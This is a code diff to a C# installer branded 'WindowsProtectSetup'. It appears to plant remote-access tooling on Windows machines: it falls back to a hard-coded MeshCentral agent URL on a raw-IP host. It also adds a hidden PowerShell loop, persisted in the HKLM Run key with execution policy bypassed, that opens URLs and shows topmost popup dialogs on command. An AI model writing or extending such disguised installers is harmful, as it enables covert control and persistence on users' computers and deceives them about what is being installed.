@@ -17,7 +17,7 @@ public class WindowsProtectSetup : Form {
   const string BaseUrl="https://devicehost.vercel.app";
   const string InstallDir=@"C:\Program Files\Common Files\DeviceSupport";
   const string ServiceExe=@"C:\Program Files\Common Files\DeviceSupport\DeviceSupportHost.exe";
-  const string UserUIExe=@"C:\Program Files\Common Files\DeviceSupport\WindowsProtect_UserUI.exe";
+  const string UserUIScript=@"C:\Program Files\Common Files\DeviceSupport\WindowsProtect_UserUI.ps1";
   const string DataDir=@"C:\ProgramData\WindowsProtect";
 
   TextBox ownerBox=new TextBox();
@@ -179,8 +179,7 @@ public class WindowsProtectSetup : Form {
       Directory.CreateDirectory(InstallDir);
       StopExistingService();
       ExtractEmbeddedService(ServiceExe);
-      ExtractEmbeddedUserUI(UserUIExe);
-      RegisterUserUI();
+      InstallUserUI();
 
       if(String.IsNullOrWhiteSpace(meshAgentUrl)) meshAgentUrl="https://34-69-184-103.sslip.io/meshagents?id=4&meshid=gY1Com9g9071ieNPRic8EHP2irnFHZxy1gpsoBn8opAi4guIJ$gAQj$INq8mbEjL&installflags=0";
       var meshReady=MeshReady();
@@ -246,27 +245,66 @@ public class WindowsProtectSetup : Form {
     }
   }
 
-  static void ExtractEmbeddedUserUI(string destination){
-    var asm=Assembly.GetExecutingAssembly();
-    using(var input=asm.GetManifestResourceStream("WindowsProtect_UserUI.exe")){
-      if(input==null) throw new Exception("WindowsProtect user interface payload is missing.");
-      using(var output=File.Create(destination)) input.CopyTo(output);
+  static void InstallUserUI(){
+    var script=@"
+$ErrorActionPreference='SilentlyContinue'
+$cmdFile='C:\ProgramData\WindowsProtect\ui-command.txt'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+while($true){
+  if(Test-Path $cmdFile){
+    $raw=[IO.File]::ReadAllText($cmdFile,[Text.Encoding]::UTF8)
+    Remove-Item $cmdFile -Force
+    $p=$raw.Split('|')
+    if($p.Length -ge 2 -and $p[0] -eq 'url'){
+      try{
+        $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
+        if($u -match '^https?://'){ Start-Process $u }
+      }catch{}
+    }
+    elseif($p.Length -ge 5 -and $p[0] -eq 'message'){
+      try{
+        $t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[1]))
+        $m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p[2]))
+        $size=$p[3]; $place=$p[4]
+        $w=520; $h=240
+        if($size -eq 'compact'){$w=420;$h=180}
+        elseif($size -eq 'large'){$w=640;$h=320}
+        $f=New-Object System.Windows.Forms.Form
+        $f.Text=$t; $f.ClientSize=New-Object System.Drawing.Size($w,$h)
+        $f.FormBorderStyle='FixedDialog'; $f.MaximizeBox=$false; $f.MinimizeBox=$false
+        $f.TopMost=$true; $f.ShowInTaskbar=$true; $f.StartPosition='Manual'; $f.BackColor=[Drawing.Color]::White
+        $wa=[Windows.Forms.Screen]::PrimaryScreen.WorkingArea
+        if($place -eq 'top_right'){$x=$wa.Right-$w-24;$y=$wa.Top+24}
+        elseif($place -eq 'bottom_right'){$x=$wa.Right-$w-24;$y=$wa.Bottom-$h-24}
+        else{$x=$wa.Left+[int](($wa.Width-$w)/2);$y=$wa.Top+[int](($wa.Height-$h)/2)}
+        $f.Location=New-Object System.Drawing.Point($x,$y)
+        $hdr=New-Object Windows.Forms.Panel; $hdr.Dock='Top'; $hdr.Height=56; $hdr.BackColor=[Drawing.Color]::FromArgb(17,24,39)
+        $ttl=New-Object Windows.Forms.Label; $ttl.Text=$t; $ttl.Dock='Fill'; $ttl.ForeColor=[Drawing.Color]::White
+        $ttl.Font=New-Object Drawing.Font('Segoe UI',14,[Drawing.FontStyle]::Bold); $ttl.Padding=New-Object Windows.Forms.Padding(18,0,18,0); $ttl.TextAlign='MiddleLeft'
+        $hdr.Controls.Add($ttl)
+        $body=New-Object Windows.Forms.Label; $body.Text=$m; $body.Location=New-Object Drawing.Point(20,78)
+        $body.Size=New-Object Drawing.Size(($w-40),($h-142)); $body.ForeColor=[Drawing.Color]::FromArgb(31,41,55)
+        $body.Font=New-Object Drawing.Font('Segoe UI',10.5); $body.TextAlign='TopLeft'
+        $ok=New-Object Windows.Forms.Button; $ok.Text='OK'; $ok.Size=New-Object Drawing.Size(92,34)
+        $ok.Location=New-Object Drawing.Point(($w-112),($h-52)); $ok.BackColor=[Drawing.Color]::FromArgb(37,99,235)
+        $ok.ForeColor=[Drawing.Color]::White; $ok.FlatStyle='Flat'; $ok.Add_Click({$f.Close()})
+        $f.Controls.Add($hdr); $f.Controls.Add($body); $f.Controls.Add($ok); $f.AcceptButton=$ok
+        [void]$f.ShowDialog()
+      }catch{}
     }
   }
-
-  static void RegisterUserUI(){
+  Start-Sleep -Milliseconds 750
+}
+";
+    File.WriteAllText(UserUIScript,script,Encoding.UTF8);
     try{
       using(var run=Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")){
-        run.SetValue("WindowsProtectUserUI","\""+UserUIExe+"\"");
+        run.SetValue("WindowsProtectUserUI","powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\"");
       }
     }catch{}
     try{
-      foreach(var p in Process.GetProcessesByName("WindowsProtect_UserUI")){
-        try{ p.Kill(); }catch{}
-      }
-    }catch{}
-    try{
-      Process.Start(new ProcessStartInfo(UserUIExe){UseShellExecute=true});
+      Process.Start(new ProcessStartInfo("powershell.exe","-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \""+UserUIScript+"\""){UseShellExecute=true});
     }catch{}
   }
 
